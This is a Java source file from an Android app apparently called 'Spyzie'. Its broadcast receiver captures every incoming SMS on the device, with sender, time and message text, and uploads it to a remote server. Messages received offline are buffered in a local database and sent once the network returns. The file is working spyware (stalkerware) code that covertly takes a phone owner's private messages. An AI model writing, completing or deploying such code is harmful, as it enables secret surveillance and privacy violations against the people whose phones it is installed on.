package com.tantd.spyzie.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.tantd.spyzie.data.db.AppDbManager;
import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.data.network.AppApiManager;
import com.tantd.spyzie.util.Constants;
import com.tantd.spyzie.util.NetworkUtils;

import java.util.List;

public class SpyzieReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle data = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");
        StringBuilder smsBody = new StringBuilder();
        SmsMessage smsMessage;
        Sms sms = new Sms();
        for (int i = 0; i < pdus.length; i++) {
            smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
            if (i == 0) {
                sms.id = -1;
                sms.address = smsMessage.getDisplayOriginatingAddress();
                sms.time = smsMessage.getTimestampMillis();
            }
            smsBody.append(smsMessage.getMessageBody());
        }
        sms.body = smsBody.toString();
        sms.isIncoming = true;
        AppApiManager.getInstance().sendSmsData(sms);

        if (NetworkUtils.isNetworkConnected(context)) {
            List<Sms> savedData = (List<Sms>) AppDbManager.getInstance().find(Sms.class, 0, Constants.MAX_READ_DATA_ENTRIES);
            savedData.add(sms);
            AppApiManager.getInstance().sendSmsData(savedData);
            savedData.remove(savedData.size() - 1);
            if (savedData.size() > 0) {
                AppDbManager.getInstance().removeSms(savedData);
            }
        } else {
            AppDbManager.getInstance().put(sms);
        }
    }
}
